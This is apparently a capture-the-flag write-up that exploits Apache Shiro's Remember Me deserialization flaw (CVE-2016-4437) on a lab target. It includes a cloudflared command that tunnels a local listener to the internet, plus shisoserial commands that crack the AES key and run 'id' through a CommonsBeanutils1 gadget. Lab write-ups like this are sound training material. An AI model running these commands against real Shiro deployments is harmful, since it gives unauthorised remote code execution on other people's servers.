---
title: Shiro
type: writeup
category: linux
platform: Infinity Learning
difficulty: Hard
os: Linux
date: 2026-05-26
avatar: avatar.png
tags:
  - CVE-2016-4437
  - shiro
summary: Exploiting Apache Shiro's Remember Me vulnerability (CVE-2016-4437) to achieve Remote Code Execution and retrieve the flag.
initialAccess: RCE via Apache Shiro deserialization vulnerability using a cracked encryption key and shisoserial.
privesc: Flag retrieval through direct Remote Code Execution.
---

# Shiro

First, let's access our target page.

![image.png](image.png)

Which has default credentials -_-.

After trying these credentials, we got the admin panel.

![image.png](image%201.png)

And there is a note in the footer.

![image.png](image%202.png)

So as you can see, it uses Apache Shiro for authentication. Let's search for any vulnerabilities for it.

After a lot of searching, I found a CVE that is related to "Remember Me": [https://nvd.nist.gov/vuln/detail/cve-2016-4437](https://nvd.nist.gov/vuln/detail/cve-2016-4437), and it's Remote Code Execution (RCE).

[https://packetstorm.news/files/id/157497](https://packetstorm.news/files/id/157497) - so as you can see, it has a Metasploit module.

![image.png](image%203.png)

It didn't work after a lot of tries, so I tried a public exploit: [https://github.com/4nth0ny1130/shisoserial](https://github.com/4nth0ny1130/shisoserial).

But first, we must use Cloudflared to start tunneling.

```bash
cloudflared tunnel --url tcp://localhost:4444
```

You will have a link, and that is the link we need.

```bash
❯ python3 shisoserial.py -m crack -u http://173.208.132.134:30707 -t CBC -p https://yourlink.com
```

![image.png](image%204.png)

Here is the key we will use:

```bash
❯ python3 shisoserial.py -m echo -u http://173.208.132.134:30707 -t CBC -k kPH+bIxk5D2deZiIxcaaaA== -c "id" -g CommonsBeanutils1
```

![image.png](image%205.png)

And here we got the RCE.

![image.png](image%206.png)

And here is our flag ;)

![image.png](image%207.png)
